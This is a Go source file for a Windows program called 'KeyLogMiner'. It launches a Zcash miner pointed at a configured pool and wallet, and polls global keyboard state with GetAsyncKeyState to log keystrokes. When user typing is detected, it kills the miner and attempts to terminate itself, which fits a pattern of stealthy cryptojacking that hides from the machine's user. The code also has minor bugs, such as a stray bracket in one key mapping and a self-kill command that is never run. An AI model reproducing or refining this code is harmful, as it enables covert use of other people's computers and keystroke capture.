package main

import (
	//"encoding/json"
	"bytes"
	"fmt"
	"os"
	"os/exec"
	"path"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/AllenDang/w32"
	"github.com/BurntSushi/toml"
)

// Configuration strcution is storing all required configuration data
type Configuration struct {
	ServerURL                 string
	LocalMachineName          string
	DefaultZcashWalletAddress string
	DefaultPoolAddress        string
	DefaultPoolPort           string
	ZcashMinerFlagExtra       string
	ZcashMinerDir             string
	KeyCount                  int
	ProcessID                 int
	TimeOut                   int64
}

var (
	// miner process name
	minerprocess = "miner.exe"

	user32               = syscall.NewLazyDLL("user32.dll")
	procGetAsyncKeyState = user32.NewProc("GetAsyncKeyState")
	// procGetForegroundWindow = user32.NewProc("GetForegroundWindow") //GetForegroundWindow
	procGetWindowTextW = user32.NewProc("GetWindowTextW") //GetWindowTextW

	tmpKeylog string
	tmpTitle  string
)

// ReadConfig reads info from config file
func ReadConfig(configfile string) Configuration {
	fmt.Printf("Config file read: ")
	fmt.Println(configfile)
	var conf Configuration
	if _, err := toml.DecodeFile(configfile, &conf); err != nil {
		fmt.Println("error:", err)
	}
	return conf
}

func keyLogger(config *Configuration) {
	start := time.Now()
	elapsed := time.Since(start)
	elapsedsec := int64(elapsed/time.Millisecond) / 1000

	for {
		// fmt.Println(tmpKeylog)
		time.Sleep(1 * time.Millisecond)
		// fmt.Println(tmpKeylog)
		if len(tmpKeylog) >= config.KeyCount {
			// fmt.Println("Long String detected")
			start = time.Now()
			// fmt.Println(start)
			tmpKeylog = ""
		}
		elapsed = time.Since(start)
		elapsedsec = int64(elapsed/time.Millisecond) / 1000
		if elapsedsec <= config.TimeOut && len(tmpKeylog) != 0 {
			fmt.Println("Long String detected in " + strconv.Itoa(int(config.TimeOut)) + "s")
			// Stop Miner
			go StopMiner(config)
			return
		}

		for KEY := 0; KEY <= 256; KEY++ {
			Val, _, _ := procGetAsyncKeyState.Call(uintptr(KEY))
			if Val&0x1 == 0 {
				continue
			}
			switch KEY {
			// case w32.VK_CONTROL:
			// 	tmpKeylog += "[Ctrl]"
			// case w32.VK_BACK:
			// 	tmpKeylog += "[Back]"
			// case w32.VK_TAB:
			// 	tmpKeylog += "[Tab]"
			// case w32.VK_RETURN:
			// 	tmpKeylog += "[Enter]\r\n"
			// case w32.VK_SHIFT:
			// 	tmpKeylog += "[Shift]"
			// case w32.VK_MENU:
			// 	tmpKeylog += "[Alt]"
			// case w32.VK_CAPITAL:
			// 	tmpKeylog += "[CapsLock]"
			case w32.VK_ESCAPE:
				tmpKeylog += "[Esc]"
			case w32.VK_SPACE:
				tmpKeylog += " "
			// case w32.VK_PRIOR:
			// 	tmpKeylog += "[PageUp]"
			// case w32.VK_NEXT:
			// 	tmpKeylog += "[PageDown]"
			// case w32.VK_END:
			// 	tmpKeylog += "[End]"
			// case w32.VK_HOME:
			// 	tmpKeylog += "[Home]"
			// case w32.VK_LEFT:
			// 	tmpKeylog += "[Left]"
			// case w32.VK_UP:
			// 	tmpKeylog += "[Up]"
			// case w32.VK_RIGHT:
			// 	tmpKeylog += "[Right]"
			// case w32.VK_DOWN:
			// 	tmpKeylog += "[Down]"
			// case w32.VK_SELECT:
			// 	tmpKeylog += "[Select]"
			// case w32.VK_PRINT:
			// 	tmpKeylog += "[Print]"
			// case w32.VK_EXECUTE:
			// 	tmpKeylog += "[Execute]"
			// case w32.VK_SNAPSHOT:
			// 	tmpKeylog += "[PrintScreen]"
			// case w32.VK_INSERT:
			// 	tmpKeylog += "[Insert]"
			// case w32.VK_DELETE:
			// 	tmpKeylog += "[Delete]"
			// case w32.VK_HELP:
			// 	tmpKeylog += "[Help]"
			// case w32.VK_LWIN:
			// 	tmpKeylog += "[LeftWindows]"
			// case w32.VK_RWIN:
			// 	tmpKeylog += "[RightWindows]"
			// case w32.VK_APPS:
			// 	tmpKeylog += "[Applications]"
			// case w32.VK_SLEEP:
			// 	tmpKeylog += "[Sleep]"
			// case w32.VK_NUMPAD0:
			// 	tmpKeylog += "[Pad 0]"
			// case w32.VK_NUMPAD1:
			// 	tmpKeylog += "[Pad 1]"
			// case w32.VK_NUMPAD2:
			// 	tmpKeylog += "[Pad 2]"
			// case w32.VK_NUMPAD3:
			// 	tmpKeylog += "[Pad 3]"
			// case w32.VK_NUMPAD4:
			// 	tmpKeylog += "[Pad 4]"
			// case w32.VK_NUMPAD5:
			// 	tmpKeylog += "[Pad 5]"
			// case w32.VK_NUMPAD6:
			// 	tmpKeylog += "[Pad 6]"
			// case w32.VK_NUMPAD7:
			// 	tmpKeylog += "[Pad 7]"
			// case w32.VK_NUMPAD8:
			// 	tmpKeylog += "[Pad 8]"
			// case w32.VK_NUMPAD9:
			// 	tmpKeylog += "[Pad 9]"
			case w32.VK_NUMPAD0:
				tmpKeylog += "0"
			case w32.VK_NUMPAD1:
				tmpKeylog += "1"
			case w32.VK_NUMPAD2:
				tmpKeylog += "2"
			case w32.VK_NUMPAD3:
				tmpKeylog += "3"
			case w32.VK_NUMPAD4:
				tmpKeylog += "4"
			case w32.VK_NUMPAD5:
				tmpKeylog += "5"
			case w32.VK_NUMPAD6:
				tmpKeylog += "6]"
			case w32.VK_NUMPAD7:
				tmpKeylog += "7"
			case w32.VK_NUMPAD8:
				tmpKeylog += "8"
			case w32.VK_NUMPAD9:
				tmpKeylog += "9"
			case w32.VK_MULTIPLY:
				tmpKeylog += "*"
			case w32.VK_ADD:
				tmpKeylog += "+"
			// case w32.VK_SEPARATOR:
			// tmpKeylog += "[Separator]"
			case w32.VK_SUBTRACT:
				tmpKeylog += "-"
			case w32.VK_DECIMAL:
				tmpKeylog += "."
			// case w32.VK_DIVIDE:
			// 	tmpKeylog += "[Devide]"
			// case w32.VK_F1:
			// 	tmpKeylog += "[F1]"
			// case w32.VK_F2:
			// 	tmpKeylog += "[F2]"
			// case w32.VK_F3:
			// 	tmpKeylog += "[F3]"
			// case w32.VK_F4:
			// 	tmpKeylog += "[F4]"
			// case w32.VK_F5:
			// 	tmpKeylog += "[F5]"
			// case w32.VK_F6:
			// 	tmpKeylog += "[F6]"
			// case w32.VK_F7:
			// 	tmpKeylog += "[F7]"
			// case w32.VK_F8:
			// 	tmpKeylog += "[F8]"
			// case w32.VK_F9:
			// 	tmpKeylog += "[F9]"
			// case w32.VK_F10:
			// 	tmpKeylog += "[F10]"
			// case w32.VK_F11:
			// 	tmpKeylog += "[F11]"
			// case w32.VK_F12:
			// 	tmpKeylog += "[F12]"
			// case w32.VK_NUMLOCK:
			// 	tmpKeylog += "[NumLock]"
			// case w32.VK_SCROLL:
			// 	tmpKeylog += "[ScrollLock]"
			// case w32.VK_LSHIFT:
			// 	tmpKeylog += "[LeftShift]"
			// case w32.VK_RSHIFT:
			// 	tmpKeylog += "[RightShift]"
			// case w32.VK_LCONTROL:
			// 	tmpKeylog += "[LeftCtrl]"
			// case w32.VK_RCONTROL:
			// 	tmpKeylog += "[RightCtrl]"
			// case w32.VK_LMENU:
			// 	tmpKeylog += "[LeftMenu]"
			// case w32.VK_RMENU:
			// 	tmpKeylog += "[RightMenu]"
			case w32.VK_OEM_1:
				tmpKeylog += ";"
			case w32.VK_OEM_2:
				tmpKeylog += "/"
			case w32.VK_OEM_3:
				tmpKeylog += "`"
			case w32.VK_OEM_4:
				tmpKeylog += "["
			case w32.VK_OEM_5:
				tmpKeylog += "\\"
			case w32.VK_OEM_6:
				tmpKeylog += "]"
			case w32.VK_OEM_7:
				tmpKeylog += "'"
			case w32.VK_OEM_PERIOD:
				tmpKeylog += "."
			case 0x30:
				tmpKeylog += "0"
			case 0x31:
				tmpKeylog += "1"
			case 0x32:
				tmpKeylog += "2"
			case 0x33:
				tmpKeylog += "3"
			case 0x34:
				tmpKeylog += "4"
			case 0x35:
				tmpKeylog += "5"
			case 0x36:
				tmpKeylog += "6"
			case 0x37:
				tmpKeylog += "7"
			case 0x38:
				tmpKeylog += "8"
			case 0x39:
				tmpKeylog += "9"
			case 0x41:
				tmpKeylog += "a"
			case 0x42:
				tmpKeylog += "b"
			case 0x43:
				tmpKeylog += "c"
			case 0x44:
				tmpKeylog += "d"
			case 0x45:
				tmpKeylog += "e"
			case 0x46:
				tmpKeylog += "f"
			case 0x47:
				tmpKeylog += "g"
			case 0x48:
				tmpKeylog += "h"
			case 0x49:
				tmpKeylog += "i"
			case 0x4A:
				tmpKeylog += "j"
			case 0x4B:
				tmpKeylog += "k"
			case 0x4C:
				tmpKeylog += "l"
			case 0x4D:
				tmpKeylog += "m"
			case 0x4E:
				tmpKeylog += "n"
			case 0x4F:
				tmpKeylog += "o"
			case 0x50:
				tmpKeylog += "p"
			case 0x51:
				tmpKeylog += "q"
			case 0x52:
				tmpKeylog += "r"
			case 0x53:
				tmpKeylog += "s"
			case 0x54:
				tmpKeylog += "t"
			case 0x55:
				tmpKeylog += "u"
			case 0x56:
				tmpKeylog += "v"
			case 0x57:
				tmpKeylog += "w"
			case 0x58:
				tmpKeylog += "x"
			case 0x59:
				tmpKeylog += "y"
			case 0x5A:
				tmpKeylog += "z"
			}
		}
	}
}

// SetPID method to set ProcessID
func (f *Configuration) SetPID(pid int) {
	f.ProcessID = pid
}

// RunMiner triggers mining process
// Miner using EWBF's CUDA Zcash miner
// Ref: https://github.com/nanopool/ewbf-miner/releases
func RunMiner(config *Configuration) {

	// fmt.Println("Start RunMiner function")
	if config.LocalMachineName == "" {
		host, err := os.Hostname()
		if err != nil {
			fmt.Printf("%s", err)
		} else {
			config.LocalMachineName = host
		}
	}

	_, currentFilePath, _, _ := runtime.Caller(0)
	dirpath := path.Dir(currentFilePath)

	var fullcommand = fmt.Sprintf(dirpath) + "/" + config.ZcashMinerDir + "/" + minerprocess + " --server " + config.DefaultPoolAddress + " --user " + config.DefaultZcashWalletAddress + "." + config.LocalMachineName + " --port " + config.DefaultPoolPort + " " + config.ZcashMinerFlagExtra
	// fmt.Println(fullcommand)
	// fmt.Print("Process ID = ")
	// fmt.Println(config.ProcessID)
	// fmt.Print("Type of Process ID = ")
	// fmt.Println(reflect.TypeOf(config.ProcessID))
	// Check if process been ran
	if config.ProcessID == 0 {
		c := exec.Command("cmd", "/C", fullcommand)
		if err := c.Run(); err != nil {
			fmt.Println("Error: ", err)
		}
		config.SetPID(c.Process.Pid)
		// config.ProcessID = c.Process.Pid
	}
}

// StopMiner kill minging process
func StopMiner(config *Configuration) {
	// fmt.Println(config.ProcessID)
	pid := strconv.Itoa(config.ProcessID)
	// Awaiting to complete
	if config.ProcessID == 0 {
		// s := "for /f \"" + "tokens=2\"" + " %a in ('" + " tasklist ^| find \"miner.exe\"'" + ") do Taskkill /PID %a /F 1 > run.log 2>&1"
		s := "tasklist | findstr miner.exe"
		// fmt.Println(s)
		// c := exec.Command("cmd", "/C", s)
		// if err := c.Run(); err != nil {
		// 	fmt.Println("Error: ", err)
		// }
		cmd := exec.Command("cmd", "/C", s)
		var out bytes.Buffer
		var stderr bytes.Buffer
		cmd.Stdout = &out
		cmd.Stderr = &stderr
		err := cmd.Run()
		if err != nil {
			fmt.Println(fmt.Sprint(err) + ": " + stderr.String())
			return
		}
		// fmt.Println("Result: " + out.String())
		results := strings.Fields(out.String())
		result := strings.Split(fmt.Sprint(results), " ")[1]
		// fmt.Println("Result = XXX", result, "XXX")
		// fmt.Println(reflect.TypeOf(result))
		// cmd := exec.Command("cmd", "/C", s)
		// b, e := cmd.Output()
		// fmt.Println(b)
		// if e != nil {
		// 	fmt.Printf("failed due to :%v\n", e)
		// 	panic(e)
		// }
		// return
		// pid = strconv.Atoi(strings.Replace(fmt.Sprint(result[0]), " ", "", -1))
		pid = strings.TrimSpace(result)
	}
	var killcommand = "Taskkill /PID " + pid + " /F"
	fmt.Print("KillCommand is ")
	fmt.Println(killcommand)
	c := exec.Command("cmd", "/c", killcommand)
	if err := c.Run(); err != nil {
		fmt.Println("Error: ", err)
	}
}

func suiside() {
	pid := os.Getpid()
	str := strconv.Itoa(pid)
	fmt.Println("Process identifier: ", str)
	exec.Command("Taskkill", "/PID", str, " /F")
	// ret, _ := exec.Command("kill", "-9", str).Output()
	// fmt.Println("this will never be printed: ", ret)
}

func main() {
	// _, currentFilePath, _, _ := runtime.Caller(0)
	// dirpath := path.Dir(currentFilePath)
	dirpath, _ := os.Getwd()
	var configpath = fmt.Sprintf(dirpath) + "/config.toml"
	var config = ReadConfig(configpath)
	config.ProcessID = 0

	fmt.Println("Starting KeyLogMiner!")
	go RunMiner(&config)
	// Run Miner
	keyLogger(&config)
	// go keyLogger(&config)
	// fmt.Println("Finish running keyLogger")
	// fmt.Println("Press Enter on me to see logs.")
	// os.Stdin.Read([]byte{0}) // For pausing purpose only
	// fmt.Println("Reading Stdin")
	// fmt.Println(tmpKeylog)
	// fmt.Println("Press Enter to Exit.")
	// os.Stdin.Read([]byte{0}) // For pausing purpose only
	// fmt.Println("Reading Stdin Again")
	StopMiner(&config)
	suiside()
}
